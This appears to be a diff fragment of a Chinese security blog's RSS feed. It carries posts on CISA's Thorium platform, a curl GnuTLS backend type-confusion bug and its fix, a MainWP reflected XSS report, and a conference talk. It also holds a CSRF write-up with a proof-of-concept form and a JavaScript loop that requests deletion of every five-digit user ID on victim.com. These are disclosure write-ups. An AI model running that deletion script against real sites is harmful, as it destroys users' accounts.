+&lt;p&gt;该平台可以与Kubernetes和ScyllaDB一起扩展以满足工作负载需求。Thorium设计用于与基础设施一起扩展，能够每小时每个权限组摄入超过1000万个文件，并每秒调度超过1700个作业，同时保持快速查询性能。&lt;/p&gt;
+&lt;h2 id=&#34;重新思考大规模恶意软件分析&#34;&gt;重新思考大规模恶意软件分析
+&lt;/h2&gt;&lt;p&gt;企业级恶意软件分析工具和平台已在安全社区广泛使用。但其中许多需要付费许可，缺乏大规模编排，或难以与企业工作流程集成。专家将Thorium视为高级恶意软件分析技术的重要民主化。&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;这是一个重大进展，因为它民主化了对以前仅用于国家安全的强大、可扩展分析框架的访问。Thorium为网络安全社区提供了重大进步。它自动化和编排复杂分析工作流程的能力，使公共和私营部门的网络防御者能够获得以前仅在昂贵或专有商业解决方案中可用的能力，&amp;ldquo;EIIRTrend &amp;amp; Pareekh Consulting的首席执行官Pareekh Jain表示。&lt;/p&gt;
+&lt;h2 id=&#34;部署要求&#34;&gt;部署要求
+&lt;/h2&gt;&lt;p&gt;虽然该平台可以从CISA的官方GitHub存储库下载，但部署Thorium需要一个预配置的Kubernetes集群，以及对块存储和对象存储的访问权限。成功设置还需要对Docker容器和集群管理有实际了解。&lt;/p&gt;
+&lt;p&gt;Jain指出，Thorium的发布可能会加速开放、模块化网络安全架构的采用，因为组织希望避免供应商锁定、降低成本并利用社区驱动的创新力量。然而，他也警告说，企业可能会面临诸如有限的DevOps技能、与遗留系统的集成挑战以及需要强大的治理框架来解决开源部署中的安全、隐私和合规风险等障碍。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>GnuTLS与OpenSSL类型混淆漏洞分析</title>
+        <link>http://localhost:1313/p/gnutls%E4%B8%8Eopenssl%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 06:54:28 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/gnutls%E4%B8%8Eopenssl%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;gnutls-curlinfo_tls_session--curlinfo_tls_ssl_ptr-类型混淆&#34;&gt;GnuTLS CURLINFO_TLS_SESSION / CURLINFO_TLS_SSL_PTR 类型混淆
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
+&lt;/h2&gt;&lt;p&gt;curl_easy_getinfo函数在处理CURLINFO_TLS_SESSION和CURLINFO_TLS_SSL_PTR时，错误地将GnuTLS后端标识为CURLSSLBACKEND_OPENSSL，导致类型混淆问题。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curl_tlssessioninfo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;curl_sslbackend&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;internals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;漏洞位于vquic-tls.c文件第211行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#elif defined(USE_GNUTLS)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;give_ssl_ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* gnutls always returns its session */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backend&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLSSLBACKEND_OPENSSL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 错误的后端标识
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;internals&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gtls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;当调用方根据backend字段动态决策时，会将gnutls_session_t错误解析为SSL_CTX/SSL结构&lt;/li&gt;
+&lt;li&gt;可能导致崩溃或其他未知影响，具体取决于应用程序如何处理错误指针&lt;/li&gt;
+&lt;li&gt;缓解因素：需同时链接GnuTLS和OpenSSL库的罕见场景才会触发&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;curl 8.15.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;构建同时支持GnuTLS和OpenSSL的应用程序&lt;/li&gt;
+&lt;li&gt;使用curl_easy_getinfo获取CURLINFO_TLS_SESSION或CURLINFO_TLS_SSL_PTR&lt;/li&gt;
+&lt;li&gt;当检测到CURLSSLBACKEND_OPENSSL时调用OpenSSL函数&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
+&lt;/h2&gt;&lt;p&gt;已通过PR #17976修复：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- info-&amp;gt;backend = CURLSSLBACKEND_OPENSSL;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ info-&amp;gt;backend = CURLSSLBACKEND_GNUTLS;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;补充说明&#34;&gt;补充说明
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;HTTP/3不支持MultiSSL特性，降低了实际影响&lt;/li&gt;
+&lt;li&gt;该问题更倾向于普通bug而非安全漏洞&lt;/li&gt;
+&lt;li&gt;项目方基于透明度原则选择公开披露&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>MainWP成本跟踪器笔记字段反射型XSS漏洞分析</title>
+        <link>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Wed, 06 Aug 2025 06:33:01 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/mainwp%E6%88%90%E6%9C%AC%E8%B7%9F%E8%B8%AA%E5%99%A8%E7%AC%94%E8%AE%B0%E5%AD%97%E6%AE%B5%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;mainwp成本跟踪器笔记字段反射型xss漏洞报告&#34;&gt;MainWP成本跟踪器笔记字段反射型XSS漏洞报告
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;p&gt;在MainWP客户端管理面板的&amp;quot;成本跟踪器&amp;quot;模块中（版本5.4.0.11），&amp;ldquo;笔记&amp;quot;输入字段存在反射型跨站脚本（XSS）漏洞。当用户添加或编辑成本时，可在笔记字段输入任意内容，若包含恶意JavaScript代码（如XSS有效载荷），由于缺乏适当的输入清理和输出编码，该代码会在保存后立即执行。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;：反射型XSS（非持久性）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;触发条件&lt;/strong&gt;：提交包含恶意脚本的笔记内容&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：当前会话立即执行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;根本原因&lt;/strong&gt;：用户输入未经过适当清理或编码就被反射回HTML响应&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;可能成为更严重XSS漏洞的入口点&lt;/li&gt;
+&lt;li&gt;对客户端安全构成风险（特别是在使用浏览器扩展、调试工具或集成第三方脚本的环境中）&lt;/li&gt;
+&lt;li&gt;降低对平台安全编码实践的信任度&lt;/li&gt;
+&lt;li&gt;可能被拥有仪表板访问权限的攻击者（如内部威胁或低权限用户）用来测试其他注入点&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;2025年6月10日：漏洞报告提交&lt;/li&gt;
+&lt;li&gt;同日11:39：MainWP团队将状态改为&amp;quot;已分类&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;同日16:05：发布补丁版本（mainwp.zip）&lt;/li&gt;
+&lt;li&gt;6月11日：验证发现补丁未完全修复&lt;/li&gt;
+&lt;li&gt;经过多次测试确认，最终在5.4.0.12版本中完全修复&lt;/li&gt;
+&lt;li&gt;6月13日：所有相关问题解决并发布，向研究者支付50美元奖金&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;6月10日06:39：初始报告&lt;/li&gt;
+&lt;li&gt;6月11日09:41：确认修复&lt;/li&gt;
+&lt;li&gt;6月13日16:43：漏洞关闭并发放奖金&lt;/li&gt;
+&lt;li&gt;7月17日：报告公开披露&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;安全建议&#34;&gt;安全建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;对所有用户输入实施严格的清理和编码&lt;/li&gt;
+&lt;li&gt;采用内容安全策略(CSP)作为额外防护层&lt;/li&gt;
+&lt;li&gt;定期进行安全审计和渗透测试&lt;/li&gt;
+&lt;li&gt;建立漏洞奖励计划鼓励负责任的披露&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>AVTOKYO2015演讲分享：漏洞猎手的烦恼与XSS漏洞技术细节</title>
+        <link>http://localhost:1313/p/avtokyo2015%E6%BC%94%E8%AE%B2%E5%88%86%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%8C%8E%E6%89%8B%E7%9A%84%E7%83%A6%E6%81%BC%E4%B8%8Exss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/</link>
+        <pubDate>Wed, 06 Aug 2025 05:39:41 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/avtokyo2015%E6%BC%94%E8%AE%B2%E5%88%86%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%8C%8E%E6%89%8B%E7%9A%84%E7%83%A6%E6%81%BC%E4%B8%8Exss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/</guid>
+        <description>&lt;h1 id=&#34;我在avtokyo2015的演讲漏洞猎手的烦恼&#34;&gt;我在AVTOKYO2015的演讲：漏洞猎手的烦恼
+&lt;/h1&gt;&lt;p&gt;本文分享我在AVTOKYO2015会议上的演讲幻灯片。AVTOKYO2015是一场于2015年11月14日在东京举办的计算机安全会议。&lt;/p&gt;
+&lt;p&gt;2013年9月，我遭遇了一个意外事件：由于ISP将我的XSS研究请求误判为攻击行为，导致我的网络连接被阻断。在演讲中，我详细讲述了这个令人沮丧的故事。同时，您还可以看到我2014年的漏洞挖掘收入数据，以及一些有趣XSS漏洞的技术细节。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;查看《漏洞猎手的烦恼》完整幻灯片&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;值得一提的是，我之前还做过题为《漏洞猎手的喜悦》的演讲，如果您感兴趣可以阅读：&lt;a class=&#34;link&#34; href=&#34;http://mksben.l0.cm/2015/07/codeblue.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://mksben.l0.cm/2015/07/codeblue.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;希望您能喜欢这些内容！
+感谢！&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt;：&lt;br&gt;
+网络安全, 幻灯片, XSS&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>通过CSRF暴力破解用户ID实现批量删除用户攻击</title>
+        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87csrf%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%94%A8%E6%88%B7id%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB/</link>
+        <pubDate>Wed, 06 Aug 2025 05:07:27 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87csrf%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%94%A8%E6%88%B7id%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E6%94%BB%E5%87%BB/</guid>
+        <description>&lt;h1 id=&#34;通过csrf暴力破解用户id删除所有用户&#34;&gt;通过CSRF暴力破解用户ID删除所有用户
+&lt;/h1&gt;&lt;p&gt;在测试某应用时发现&amp;quot;删除用户&amp;quot;模块未实施CSRF防护。攻击者只需构造恶意表单诱使管理员点击，即可任意删除用户账户。&lt;/p&gt;
+&lt;h2 id=&#34;基础csrf攻击验证&#34;&gt;基础CSRF攻击验证
+&lt;/h2&gt;&lt;p&gt;删除请求中未包含CSRF令牌，典型PoC如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://victim.com/delete&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;userid&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;12345&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;用户id暴力破解挑战&#34;&gt;用户ID暴力破解挑战
+&lt;/h2&gt;&lt;p&gt;系统使用5位数字作为用户ID，但未在任何端点泄露ID信息。受&lt;a class=&#34;link&#34; href=&#34;https://pwndizzle.blogspot.in&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PwnDizzle的博客&lt;/a&gt;启发，尝试通过点击劫持暴力破解ID。&lt;/p&gt;
+&lt;h2 id=&#34;技术突破点&#34;&gt;技术突破点
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;X-Frame-Options限制&lt;/strong&gt;：应用设置了X-Frame-Options头，阻止iframe加载&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Origin验证&lt;/strong&gt;：XMLHttpRequest因服务端校验Origin头而失效&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;最终方案&lt;/strong&gt;：通过iframe靶向提交请求（虽无法读取响应，但请求可成功发送）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;攻击脚本实现&#34;&gt;攻击脚本实现
+&lt;/h2&gt;&lt;p&gt;编写CSRF脚本自动遍历所有可能的用户ID，当管理员触发时即可删除所有现存用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 示例代码：批量发送删除请求
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;99999&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;iframe&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`https://victim.com/delete?userid=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;实施CSRF令牌机制&lt;/li&gt;
+&lt;li&gt;使用随机UUID替代连续数字ID&lt;/li&gt;
+&lt;li&gt;关键操作需二次认证&lt;/li&gt;
+&lt;li&gt;设置速率限制防止暴力破解&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;该漏洞演示了当CSRF防护缺失时，结合其他弱点可能造成的灾难性后果。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>MAPP 计划更新：降低信息泄露风险的行动措施</title>
